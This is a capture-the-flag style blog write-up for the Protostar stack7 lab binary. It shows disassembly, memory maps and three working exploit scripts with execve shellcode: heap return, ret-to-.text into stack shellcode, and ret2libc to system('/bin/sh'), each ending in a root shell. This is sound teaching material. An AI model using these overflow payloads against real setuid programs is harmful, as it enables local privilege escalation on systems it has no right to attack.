---
layout: post
title: Protostar - Stack 7
description: >
  Walkthrough of a simple binary exploitation
image: /assets/img/posts/protostar7.png
categories: [BinaryExploitation, stack overflow]
---
# Protostar - Stack 7

## Table of contents

* list
{:toc}

## Target Binary

| Name           | Description                                               |
|----------------|-----------------------------------------------------------|
| File           | stack7 (https://exploit-exercises.lains.space/protostar/) |
| OS             | GNU/Linux 2.6.18                                          |
| Format         | setuid ELF 32-bit LSB executable                          |
| ASLR           | Not enabled                                               |
| Stack canaries | Not enabled                                               |
| NX             | Not enabled                                               |
| Symbol data    | Available                                                 |

For a detailed walkthrough on how to obtain this information, you can check this [post](./2020-05-09-protostar-stack5.md).

## Walkthrough

### Analyze function symbols

As part of the analysis, the function symbols were obtained through `gdb`:

```
(gdb) info functions
All defined functions:

File stack7/stack7.c:
char *getpath(void);
int main(int, char **);

Non-debugging symbols:
0x08048354  _init
0x08048394  __gmon_start__
0x08048394  __gmon_start__@plt
0x080483a4  gets
0x080483a4  gets@plt
0x080483b4  __libc_start_main
0x080483b4  __libc_start_main@plt
0x080483c4  _exit
0x080483c4  _exit@plt
0x080483d4  fflush
0x080483d4  fflush@plt
0x080483e4  printf
0x080483e4  printf@plt
0x080483f4  strdup
0x080483f4  strdup@plt
0x08048410  _start
0x08048440  __do_global_dtors_aux
0x080484a0  frame_dummy
0x08048560  __libc_csu_fini
0x08048570  __libc_csu_init
0x080485ca  __i686.get_pc_thunk.bx
0x080485d0  __do_global_ctors_aux
0x080485fc  _fini
```

Similar to protostar/stack5 ([link](./2020-05-09-protostar-stack5.md)), this binary does not contain much. It has two user defined functions `main` and `getpath`. And some clib functions such as `gets`, `puts`, `printf` among others.

### Analyze program flow

By disassembling the program it is possible to observe that `main` is really simple, it just calls a function called `getpath`

```
$ objdump -M intel -D stack7
...
08048545 <main>:
 8048545:       55                      push   ebp
 8048546:       89 e5                   mov    ebp,esp
 8048548:       83 e4 f0                and    esp,0xfffffff0
 804854b:       e8 74 ff ff ff          call   80484c4 <getpath>
```

GDB was used to analyze the `getpath` function disassembly:

```
(gdb) disassemble
Dump of assembler code for function getpath:
0x080484c4 <getpath+0>:	push   ebp
0x080484c5 <getpath+1>:	mov    ebp,esp
0x080484c7 <getpath+3>:	sub    esp,0x68                    ; Allocate 0x68 bytes in stack
0x080484ca <getpath+6>:	mov    eax,0x8048620
0x080484cf <getpath+11>:	mov    DWORD PTR [esp],eax     
0x080484d2 <getpath+14>:	call   0x80483e4 <printf@plt>  ; *Prints string stored at 0x8048620
0x080484d7 <getpath+19>:	mov    eax,ds:0x8049780
0x080484dc <getpath+24>:	mov    DWORD PTR [esp],eax
0x080484df <getpath+27>:	call   0x80483d4 <fflush@plt>  ; Flushes a stream
0x080484e4 <getpath+32>:	lea    eax,[ebp-0x4c]          ; Calculates a pointer at 0x4c bytes from ebp
0x080484e7 <getpath+35>:	mov    DWORD PTR [esp],eax
0x080484ea <getpath+38>:	call   0x80483a4 <gets@plt>    ; Calls gets with ebp-0x4c (A local variable in getpath stack frame)
0x080484ef <getpath+43>:	mov    eax,DWORD PTR [ebp+0x4] ; EAX = EBP + 0x4 (This is the return pointer address)
0x080484f2 <getpath+46>:	mov    DWORD PTR [ebp-0xc],eax ; Derreferences EAX into EBP -0xc (This would be the return pointer value)
0x080484f5 <getpath+49>:	mov    eax,DWORD PTR [ebp-0xc] ; EAX = EIP
0x080484f8 <getpath+52>:	and    eax,0xb0000000          ; EAX = EAX & 0xb0000000 
0x080484fd <getpath+57>:	cmp    eax,0xb0000000          ; EAX == 0xb0000000?
0x08048502 <getpath+62>:	jne    0x8048524 <getpath+96>  ; if not equals go to 0x8048524

; EAX == 0xb0000000
0x08048504 <getpath+64>:	mov    eax,0x8048634
0x08048509 <getpath+69>:	mov    edx,DWORD PTR [ebp-0xc]
0x0804850c <getpath+72>:	mov    DWORD PTR [esp+0x4],edx
0x08048510 <getpath+76>:	mov    DWORD PTR [esp],eax
0x08048513 <getpath+79>:	call   0x80483e4 <printf@plt>   ; **Prints the string stored at 0x8048634
0x08048518 <getpath+84>:	mov    DWORD PTR [esp],0x1
0x0804851f <getpath+91>:	call   0x80483c4 <_exit@plt>    ; Aborts execution

; EAX != 0xb0000000
0x08048524 <getpath+96>:	mov    eax,0x8048640            
0x08048529 <getpath+101>:	lea    edx,[ebp-0x4c]
0x0804852c <getpath+104>:	mov    DWORD PTR [esp+0x4],edx
0x08048530 <getpath+108>:	mov    DWORD PTR [esp],eax
0x08048533 <getpath+111>:	call   0x80483e4 <printf@plt>   ; Calls printf with the same pointer passed to gets (ebp-0x4c)
0x08048538 <getpath+116>:	lea    eax,[ebp-0x4c]
0x0804853b <getpath+119>:	mov    DWORD PTR [esp],eax
0x0804853e <getpath+122>:	call   0x80483f4 <strdup@plt>   ; Duplicates the given string
0x08048543 <getpath+127>:	leave  
0x08048544 <getpath+128>:	ret                             ; Return normally
End of assembler dump.
```

*<em>Content of 0x8048620: "input path please:" </em>
```
$ objdump -sj .rodata stack7

stack7:     file format elf32-i386

Contents of section .rodata:
 8048618 03000000 01000200 696e7075 74207061  ........input pa
 8048628 74682070 6c656173 653a2000 627a7a7a  th please:
```

**<em>Content of 0x80483e4 "bzzz" </em>
```
$ objdump -sj .rodata stack7

stack7:     file format elf32-i386
...
 8048628 74682070 6c656173 653a2000 627a7a7a  th please: .bzzz
```

Based on the disassembly it seems that the function is asking the user to provide a path. The program reads the path from the `stdin` through `gets` to later store it in a local stack variable. It is known that`gets` is a vulnerable function, which attackers can take advantage from. After `gets` is executed, the function loads the return pointer (ret) of the current stack frame and does a comparison to know if the address does not have the following form: 0xbXXXXXXX.

### Identifying the vulnerability

Due to the check mentioned previously, even if the control flow of the program is hijacked (by abusing `gets` vulnerability to overwrite the stack and the return pointer of `getpath`), the return address can't have the form 0xbXXXXXXX, otherwise program will end abruptly. 

Dumping the memory map of the binary can help in determining which addresses can be used to overwrite the return pointer:

```
user@protostar:/proc/2282$ ps -fa
UID        PID  PPID  C STIME TTY          TIME CMD
user      1632  1626  0 14:07 tty1     00:00:00 -sh
user      1644  1641  0 14:10 pts/0    00:00:00 /bin/bash
user      2097  2094  0 16:43 pts/1    00:00:00 /bin/sh
user      2100  2097  0 16:43 pts/1    00:00:00 /bin/bash
user      2302  1644  0 17:40 pts/0    00:00:00 gdb ./stack7
user      2320  2302  0 17:42 pts/0    00:00:00 /opt/protostar/bin/stack7
user      2322  2100  0 17:43 pts/1    00:00:00 ps -fa

user@protostar:/proc/2282$ cat /proc/2320/maps
08048000-08049000 r-xp 00000000 00:0f 3416       /opt/protostar/bin/stack7
08049000-0804a000 rwxp 00000000 00:0f 3416       /opt/protostar/bin/stack7
0804a000-0806b000 rwxp 00000000 00:00 0          [heap]
b7e96000-b7e97000 rwxp 00000000 00:00 0 
b7e97000-b7fd5000 r-xp 00000000 00:0f 759        /lib/libc-2.11.2.so
b7fd5000-b7fd6000 ---p 0013e000 00:0f 759        /lib/libc-2.11.2.so
b7fd6000-b7fd8000 r-xp 0013e000 00:0f 759        /lib/libc-2.11.2.so
b7fd8000-b7fd9000 rwxp 00140000 00:0f 759        /lib/libc-2.11.2.so
b7fd9000-b7fdc000 rwxp 00000000 00:00 0 
b7fde000-b7fe2000 rwxp 00000000 00:00 0 
b7fe2000-b7fe3000 r-xp 00000000 00:00 0          [vdso]
b7fe3000-b7ffe000 r-xp 00000000 00:0f 741        /lib/ld-2.11.2.so
b7ffe000-b7fff000 r-xp 0001a000 00:0f 741        /lib/ld-2.11.2.so
b7fff000-b8000000 rwxp 0001b000 00:0f 741        /lib/ld-2.11.2.so
bffeb000-c0000000 rwxp 00000000 00:00 0          [stack]
```

Jumping **directly** to `libc` to do a ret2libc attack might not be possible, neither jumping into some section of the stack containing shellcode. As the stack and shared objects are mapped under addresses that start with 0xb.

As observed above, the only interesting memory mappings that are available to jump to are: the heap and the memory mapped to '/opt/protostar/bin/stack7'. Neither the stack nor the external libraries are available to jump, at least directly.

To understand which specific sections of '/opt/protostar/bin/stack7' are mapped into the non-0xbXXXXXXX memory regions, the `info file` gdb command was used:

```
(gdb) info file
Symbols from "/opt/protostar/bin/stack7".
Unix child process:
	Using the running image of child process 2036.
	While running this, GDB does not access memory from...
Local exec file:
	`/opt/protostar/bin/stack7', file type elf32-i386.
	Entry point: 0x8048410
	0x08048114 - 0x08048127 is .interp
	0x08048128 - 0x08048148 is .note.ABI-tag
	0x08048148 - 0x0804816c is .note.gnu.build-id
	0x0804816c - 0x080481a8 is .hash
	0x080481a8 - 0x080481cc is .gnu.hash
	0x080481cc - 0x0804826c is .dynsym
	0x0804826c - 0x080482d8 is .dynstr
	0x080482d8 - 0x080482ec is .gnu.version
	0x080482ec - 0x0804830c is .gnu.version_r
	0x0804830c - 0x0804831c is .rel.dyn
	0x0804831c - 0x08048354 is .rel.plt
	0x08048354 - 0x08048384 is .init
	0x08048384 - 0x08048404 is .plt
	0x08048410 - 0x080485fc is .text
	0x080485fc - 0x08048618 is .fini
	0x08048618 - 0x0804864d is .rodata
	0x08048650 - 0x08048654 is .eh_frame
	0x08049654 - 0x0804965c is .ctors
	0x0804965c - 0x08049664 is .dtors
	0x08049664 - 0x08049668 is .jcr
	0x08049668 - 0x08049738 is .dynamic
	0x08049738 - 0x0804973c is .got
	0x0804973c - 0x08049764 is .got.plt
	0x08049764 - 0x0804976c is .data
	0x08049780 - 0x0804978c is .bss
	0xb7fe3114 - 0xb7fe3138 is .note.gnu.build-id in /lib/ld-linux.so.2
    ...
```

Based on this information there are two potential targets that can be used for exploitation: the `heap` and '/opt/protostar/bin/stack7' `.text` section.

**NOTE:** `.text` section contains the instructions to be executed for a program.

### Exploitation

#### Exploiting the heap

The function `getpath` has an interesting particularity. It first stores the stdin obtained through `gets` in the stack, to later use `strdup` to allocate space in the `heap` and copy the string into the allocated memory. This can be easily observable in the assembly below:

```
(gdb) disassemble
Dump of assembler code for function getpath:
...
0x080484e4 <getpath+32>:	lea    eax,[ebp-0x4c]          ; Pointer to char[]
0x080484e7 <getpath+35>:	mov    DWORD PTR [esp],eax
0x080484ea <getpath+38>:	call   0x80483a4 <gets@plt>    ; Calls gets with ebp-0x4c (A local variable in getpath stack frame)

0x08048538 <getpath+116>:	lea    eax,[ebp-0x4c]           ; Pointer to char[]
0x0804853b <getpath+119>:	mov    DWORD PTR [esp],eax
0x0804853e <getpath+122>:	call   0x80483f4 <strdup@plt>   ; Duplicates the given string
0x08048543 <getpath+127>:	leave  
0x08048544 <getpath+128>:	ret                             ; Return normally
End of assembler dump.
```

Given this, it is possible to hijack the return address of `getpath`'s stack frame to point to a section in the heap that contains the instructions desired to be executed. This is possible since the same payload read by `gets` into the stack will be copied into the `heap`'s memory. Memory addresses for which the `(0xb0000000 & address) != 0xb0000000` check is true, as the `heap` is contained in the following range: 0x0804a000-0x0806b000.

The exploit is illustrated in the following diagram:

```
                                      0xbffeb000-0xc0000000
                    +-------------+-------+---------------------+----------+
                    |             |       |                     |          |
Stack     +-------> |Padding      |Return |   NOP Sled          | Shell    |
                    |             |Address|                     | Code     |
                    +----------------+--------------------------+----------+
                                     |
                                     +--------------+
                    +-------------+-----------------|-----------+----------+
                    |             |       |         v           |          |
Heap      +-------> |Padding      |Return |   NOP Sled          | Shell    |
                    |             |address|                     | Code     |
                    +-------------------------------------------+----------+
                                      0x0804a000-0x0806b000

```

As the first step, the required padding to overwrite the return address is calculated (for a more detailed explanation on how to do this, check [here](./2020-05-09-protostar-stack5.md)). The pointer passed to `gets` is [ebp-0x4c], and the return address for `getpath`'s stack frame is stored in [ebp+0x4]. To calculate the required padding [ebp-0x4c] was subtracted from [ebp+0x4]:

$$
padding = [ebp+0x4] - [ebp-0x4c]  \\
padding = 0x4 + 0x4c = 0x50 = 80
$$

The next step is to determine the heap address to jump at. To extract this, gdb was used to read the return value of `strdup`. 

```
(gdb) disassemble 
Dump of assembler code for function getpath:
...
0x0804853b <getpath+119>:	mov    DWORD PTR [esp],eax
0x0804853e <getpath+122>:	call   0x80483f4 <strdup@plt>
0x08048543 <getpath+127>:	leave  
0x08048544 <getpath+128>:	ret    
End of assembler dump.
(gdb) x $eip
0x8048543 <getpath+127>:	0x8955c3c9
(gdb) x $eax
0x804a008:	0x41414141
```

In this architecture (x86) the return value is stored in EAX. To retrieve the pointer to the heap where the string was copied, EAX was dumped after the function `strdup` returned. From the `gdb` output above, it can be observed that the pointer to the heap is 0x0804a008.

**NOTE:** The returned pointer might vary depending on previous heap allocations and frees. In this particular case this is the only heap allocation happening in the binary. Meaning that the pointer returned will always be the same. 

As stated above, the pointer returned will always be the same for this specific program. But in order to reflect a more real scenario a bigger memory can be allocated in the heap and as part of the payload include a NOP sled that will lead to shellcode. Which increases the probability of aiming to an address that will result in shellcode being executed.

The final step is to determine the shellcode to be run. The shellcode selected was authored by bolonobolo, and the source can be found [here](https://www.exploit-db.com/exploits/47513).

To execute this exploit, the following python script was written to create the input passed to the program.

```python
import struct
nopSled = "\x90" * 163
shellcode = "\x99\xf7\xe2\x8d\x08\xbe\x2f\x2f\x73\x68\xbf\x2f\x62\x69\x6e\x51\x56\x57\x8d\x1c\x24\xb0\x0b\xcd\x80"
padding = "\xAA" * 80
returnPointer = struct.pack("I", 0x804a060)
print(padding + returnPointer + nopSled + shellcode + "\x00")
```

By executing the program with the generated input (and using `cat` to maintain the std input pipe open), a root shell can be obtained:

```
user@protostar:~$ (python ~/py.py ; cat) | /opt/protostar/bin/stack7
input path please: got path ������������������������������������������//sh�/binQVW�$�
                                                                                    ������������
whoami
root
```

**PITFALL**: Initially a bigger payload was used. It was done to increase the NOP-sled size. Although, this always resulted in a segmentation fault. This happened because the `malloc` function called from `strdup` was trying to access variables in the upper part of the stack which was overwritten by the payload, causing an access violation before the `getpath` function returned to the shellcode. The payload size was then calculated so that these variables are not overwritten.

#### Return to .text

As stated previously it is possible to jump back to the program `.text` section (as their addresses are allowed by the `(0xb0000000 & address) != 0xb0000000` check). Exploits such as "Return Oriented Programming" (ROP) use the existing instructions to gain control over the execution. In this case a similar but much simpler approach will be performed.

In order to surpass the check, the program will be instrumented to return into another `ret` instruction contained in the `.text` section. Then when executing the given `ret` instruction it is possible to jump again, but now into any address desired.

This is illustrated in the following figure:

```
                function:getpath            Stack
                                            (Overwriten payload)
0x08048538     +----------------+         +---------------+
               |lea             |         |               |
               |eax,[ebp-0x4c]  |         |               |
0x0804853b     +----------------+         | Padding       |
               |mov   DWORD PTR |         |               |
               |[esp],eax       |         |               |
0x0804853e     +----------------+         |               |
               |call   0x80483f4|         +---------------+
               |                |         |               |
0x08048543     +----------------+         |0x08048553     | <----+getpath return address
               |leave           |         +---------------+
               |                |         |Desired        |
0x08048544     +----------------+         |ret address    |
               |ret             +---+     +---------------+
               |                |   |     |               |
               +----------------+   |     |               |
                                    |     |               |
                                    |     |               |
                Somewhere in        |     |               |
                .text               |     |               |
 0x08048552    +----------------+   |     |               |
               |                |   |     +---------------+
               | pop ebp        |   |
 0x08048553    +----------------+   |
               |                <---+
               | ret            +---------> Return to desired address
               +----------------+
```

##### Stack exploitation option

ROP is frequently used to surpass the NX countermeasure. But in this particular case the program only vets the ret pointer but not much else. Stack is still executable (NX feature is disabled). By taking advantage of this, it is possible to craft an exploit such as it initially jumps into a `ret` instruction from the `.text` section, and then from there it jumps back to the stack. As it is illustrated below:

```
                function:getpath            Stack
                                            (Overwriten payload)
0x08048538     +----------------+         +---------------+
               |lea             |         |               |
               |eax,[ebp-0x4c]  |         |               |
0x0804853b     +----------------+         | Padding       |
               |mov   DWORD PTR |         |               |
               |[esp],eax       |         |               |
0x0804853e     +----------------+         |               |
               |call   0x80483f4|         +---------------+
               |                |         |               |
0x08048543     +----------------+         |0x08048553     | <----+ getpath return address
               |leave           |         +---------------+
               |                |         |Desired        |
0x08048544     +----------------+         |ret address    |
               |ret             +---+     +---------------+
               |                |   |     |NOP Sled       |
               +----------------+   |     |               |
                                    |  +-->               |
                                    |  |  |               |
                Somewhere in        |  |  +---------------+
                .text               |  |  |Shellcode      |
 0x08048552    +----------------+   |  |  |               |
               |                |   |  |  +---------------+
               | pop ebp        |   |  |
 0x08048553    +----------------+   |  |
               |                <---+  |
               | ret            +------+
               +----------------+
```

For the exploit to be crafted, an address pointing to a `ret` instruction in the `.text` section is required. It is possible to reuse the `ret` instruction of `getpath` (0x08048544) or `main` (0x08048553).

The next step is to obtain an address in the stack that will contain the exploit. This can be done by analyzing the base pointer of the `getpath` function.

```
Breakpoint 2, getpath () at stack7/stack7.c:11
11	in stack7/stack7.c

(gdb) x $ebp
0xbffff7b8:	0xbffff7c8
```

The payload needs to be constructed as:

```
80 bytes             4 bytes      4 bytes    n bytes          n bytes
+-----------------------------------------------------------------------+
| Padding            |`ret`      |Nop-Sled  |Nop-Sled        |Shellcode |
|                    |address    |address   |                |          |
+-------------------------------------------+----------------+----------+
```

A stack frame is organized such as the return address,which is 4 bytes away from the address contained in EBP. And due to the double `ret`, payload requires to store 2 return pointers (of 4 bytes each). Given this, it can be determined that the Nop-Sled will start 8 bytes from the EBP.

The following python script was done to hijack the execution. Same shellcode shown in the "Exploiting the Heap" section was used.

```python
import struct
padding = "\xAA" * 80
retReturnPointer = struct.pack("I", 0x08048553) #Address of main ret instruction.
stackReturnPointer = struct.pack("I", 0xbffff7b8 + 0x8 +0x20) #EBP + Offset to nopSled + Some slack in case stack is different
nopSled = "\x90" * 150
shellcode = "\x99\xf7\xe2\x8d\x08\xbe\x2f\x2f\x73\x68\xbf\x2f\x62\x69\x6e\x51\x56\x57\x8d\x1c\x24\xb0\x0b\xcd\x80"
print(padding + retReturnPointer + stackReturnPointer + nopSled + shellcode + "\x00")
```

**NOTE:** As mentioned in the previous [article](./2020-05-09-protostar-stack5.md) the stack can change from execution to execution, so a NOP-Sled will be included as part of the payload as well.

By executing the program with the generated input (and using `cat` to maintain the std input pipe open), a root shell can be obtained:

```
user@protostar:~$ (python ~/py.py ; cat) | /opt/protostar/bin/stack7
input path please: got path ����������������������������������������������������������������S������������S�������������������������������������������������������������������������������������������������������������������������������������������������������������//sh�/binQVW�$�

whoami
root
pwd
/home/user
```


##### Ret2LibC exploitation option

Ret2LibC is an attack that looks to "recycle" code from existent libraries such as LibC (C standard library). This technique is mainly used when the target binary has some sort of protection to prevent code execution in the stack.

To begin with, it is essential to find some pieces of code such as `system`. `system` is a function that allows to execute bash commands so it can be used to get a shell (or any other command injection). When searching for `system` in libc in the target program, it is possible to observe that it resides at the address `0xb7ecffb0`. 

```
(gdb) print system
$1 = {<text variable, no debug info>} 0xb7ecffb0 <__libc_system >
```

Therefore, it is not possible to jump directly to libC, due to the check of the return pointer. As mentioned above, a return to .text is needed in order to bypass the address check and then jump to libC.

By looking at the process memory mapping of the target program, it is possible to determine the libC version and location that the target program is using; i.e, /lib/libc-2.11.2.so:

```
(gdb) info proc mapping
process 1856
cmdline = '/opt/protostar/bin/stack7'
cwd = '/opt/protostar/bin'
exe = '/opt/protostar/bin/stack7'
Mapped address spaces:

	Start Addr   End Addr       Size     Offset objfile
	 0x8048000  0x8049000     0x1000          0        /opt/protostar/bin/stack7
	 0x8049000  0x804a000     0x1000          0        /opt/protostar/bin/stack7
	0xb7e96000 0xb7e97000     0x1000          0
	0xb7e97000 0xb7fd5000   0x13e000          0         /lib/libc-2.11.2.so ; LibC
...
```
As part of this exploit, it is intended to pass `/bin/sh` to `system` to get a shell. In order to determine the location of /bin/sh in `libc-2.11.2.so`, objdump was used to calculate the offset of `/bin/sh`. 
```
$ objdump -sj .rodata /lib/libc-2.11.2.so | grep "bin"
 11f3c0 62696e2f 73680065 78697420 30006361  bin/sh.exit 0.ca
```
As seen above, the offset of `/bin/sh` is  `0x11f3bf` (`0x11f3c0 - 0x1`, which is the "/" at the beginning of the string that was omitted in the objdump search output). This is the argument that we want to pass to the `system` call so we can pop a shell. 

Now, the information needed to perform a Ret2LibC attack is known. However, the address check bypass is still missing. To bypass the check, a mini-ROP is needed so it's time to search for a `ret` instruction that could be abused for those purposes. A `ret` instruction moves the address at the top of the stack into EIP and decrement the stack by a `WORD` (`ESP + 0x4`). The goal is to prepare the stack to contain the address of `ret` instruction in `getpath` function; the address of `system`; 4 bytes of padding that are needed since we are jumping to `system` directly without the use of a `call` instruction (`call` instruction pushes the EIP to the stack so we need to add a padding of 4 bytes to compensate the missing 4 bytes of the EIP which is going to work as a fake return address); and the command that is going to be passed to `system` in this case `/bin/sh`.

Thus, the exploit to bypass the address check is the next one:
```python
import struct

padding = "\xAA" * 80
paddingROP = "\xBB" * 4                        # 1 WORD of padding as the fake return address
retAddress = struct.pack("I", 0x8048544)       # Address of ret instruction in getpath
systemAddress = struct.pack("I", 0xb7ecffb0)   # Address of system
shellAddress = struct.pack("I", 0xb7fb63bf)    # Address that points to /bin/shell

print(padding + retAddress + systemAddress + paddingROP + shellAddress)
```

The stack shall look as follows:
$$
Padding of 0xAA's = 80 bytes
ret instruction in getpath (ret to .txt) = 0x8048544
system address = 0xb7ecffb0
fake system return address = 0xbbbbbbbb
Pointer to /bin/sh = 0xb7fb63bf
$$ 
```
        +----------------+
        | ESP            |   Padding
        |                |
        +----------------+
        |0x8048544       |
        |                |  Address of ret instruction in getpath
        +----------------+
        |0xb7ecffb0      |  system function address
        |                |
        +----------------+
        |\xBB\xBB\xBB\xBB|  ROP padding of arbitraty 0x4 bytes (fake system return address) 
        +----------------+
        |0xb7fb63bf      |  Address that points to /bin/sh, which is the parameter that will be passed to system
        |                |
        +----------------+
```
After preparing the stack and before executing the `ret` instruction of getpath, this is how it looks in gdb:
```
(gdb) x/30x $esp
0xbffff7ac:	0x08048544	0xb7ecffb0	0xbbbbbbbb	0xb7fb63bf
```
```
(gdb) info registers
eax            0x804a008	134520840
ecx            0x0	0
edx            0x1	1
ebx            0xb7fd7ff4	-1208123404
esp            0xbffff7b4	0xbffff7b4
ebp            0xaaaaaaaa	0xaaaaaaaa
esi            0x0	0
edi            0x0	0
eip            0xb7ecffb0	0xb7ecffb0 <__libc_system> ; Instruction pointer 
```
At this point, the stack looks like this:

```
    +----------------+
    |0xb7ecffb0      |  EBP
+---+                |
|   +----------------+
|   |\xBB\xBB\xBB\xBB|  4 bytes of padding to compensate the missing EIP
|   |                |
|   +----------------+
|   |0xb7fb63bf      |  Arguments passed to system (Pointer to /bin/sh)
+-->+                |
    +----------------+

```

Once that the program execution has jumped to `system` the pointer to `/bin/sh` will be passed as an argument. After the exploit was executed, a shell was popped back:

```
$ (python exploit_stack7.py; cat) | /opt/protostar/bin/stack7
input path please: got path ����������������������������������������������������������������D������������D��췻����c�
whoami
root
```
**HAPPY HACKING :)**
